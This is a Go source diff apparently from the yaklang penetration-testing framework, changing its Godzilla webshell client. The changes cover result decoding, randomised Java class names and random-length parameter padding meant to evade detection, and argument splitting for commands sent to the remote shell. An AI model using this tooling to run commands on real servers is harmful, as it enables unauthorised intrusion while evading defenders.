@@ -16,6 +16,7 @@ import (
 	"github.com/yaklang/yaklang/common/yak"
 	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
 	"net/http"
+	"strconv"
 	"strings"
 )
 
@@ -148,12 +149,15 @@ func (g *Godzilla) echoResultDecode(raw []byte) ([]byte, error) {
 	if g.customEchoDecoder != nil {
 		return g.customEchoDecoder(raw)
 	}
+	if len(g.PayloadScriptContent) == 0 {
+		return raw, nil
+	}
 	return g.EchoResultDecodeFormYak(raw)
 }
 
 func (g *Godzilla) EchoResultDecodeFormYak(raw []byte) ([]byte, error) {
 	if len(g.PayloadScriptContent) == 0 {
-		return g.deCryption(raw)
+		return nil, utils.Error("empty payload script content")
 	}
 	engine, err := yak.NewScriptEngine(1000).ExecuteEx(g.PayloadScriptContent, map[string]interface{}{
 		"YAK_FILENAME": "req.GetScriptName()",
@@ -272,14 +276,13 @@ func (g *Godzilla) dynamicUpdateClassName(oldName string, classContent []byte) (
 	g.dynamicFuncName[oldName+".java"] = fakeSourceFileName + ".java"
 
 	// 替换 execCommand() 函数为 execCommand2() 函数, 这里只是暂时一下替换函数名的功能
-	err = clsObj.SetMethodName("getBasicsInfo", "getBasicsInfo2")
-	if err != nil {
-		return nil, err
-	}
-	g.dynamicFuncName["getBasicsInfo"] = "getBasicsInfo2"
+	//err = clsObj.SetMethodName("getBasicsInfo", "getBasicsInfo2")
+	//if err != nil {
+	//	return nil, err
+	//}
+	//g.dynamicFuncName["getBasicsInfo"] = "getBasicsInfo2"
 
 	newClassName := payloads.RandomClassName()
-	//newClassName := "go0pzzz"
 	// 随机替换类名
 	err = clsObj.SetClassName(newClassName)
 	if err != nil {
@@ -287,8 +290,6 @@ func (g *Godzilla) dynamicUpdateClassName(oldName string, classContent []byte) (
 	}
 	log.Info(fmt.Sprintf("%s ----->>>>> %s", oldName, newClassName))
 	g.dynamicFuncName[oldName] = newClassName
-	de := hex.EncodeToString(clsObj.Bytes())
-	log.Infof("base64 encode class: %s", de)
 	return clsObj.Bytes(), nil
 }
 
@@ -337,8 +338,8 @@ func (g *Godzilla) sendPayload(data []byte) ([]byte, error) {
 // EvalFunc 个人简单理解为调用远程 shell 的一个方法，以及对指令的序列化，并且发送指令
 func (g *Godzilla) EvalFunc(className, funcName string, parameter *godzilla.Parameter) ([]byte, error) {
 	// 填充随机长度
-	//r1, r2 := utils.RandSampleInRange(10, 20), utils.RandSampleInRange(10, 20)
-	//parameter.AddString(r1, r2)
+	r1, r2 := utils.RandSampleInRange(10, 20), utils.RandSampleInRange(10, 20)
+	parameter.AddString(r1, r2)
 	if className != "" && len(strings.Trim(className, " ")) > 0 {
 		switch g.ShellScript {
 		case ypb.ShellScript_JSPX.String():
@@ -546,6 +547,20 @@ func (g *Godzilla) CommandExec(cmd string, opts ...behinder.ExecParamsConfig) ([
 	}
 	parameter := newParameter()
 	parameter.AddString("cmdLine", cmd)
+	commandArgs := godzilla.SplitArgs(cmd)
+	for i := 0; i < len(commandArgs); i++ {
+		parameter.AddString(fmt.Sprintf("arg-%d", i), commandArgs[i])
+	}
+	parameter.AddString("argsCount", strconv.Itoa(len(commandArgs)))
+
+	executableArgs := godzilla.SplitArgsEx(cmd, 1, false)
+	if len(executableArgs) > 0 {
+		parameter.AddString("executableFile", executableArgs[0])
+		if len(executableArgs) >= 2 {
+			parameter.AddString("executableArgs", executableArgs[1])
+		}
+	}
+
 	return g.EvalFunc("", "execCommand", parameter)
 }
 
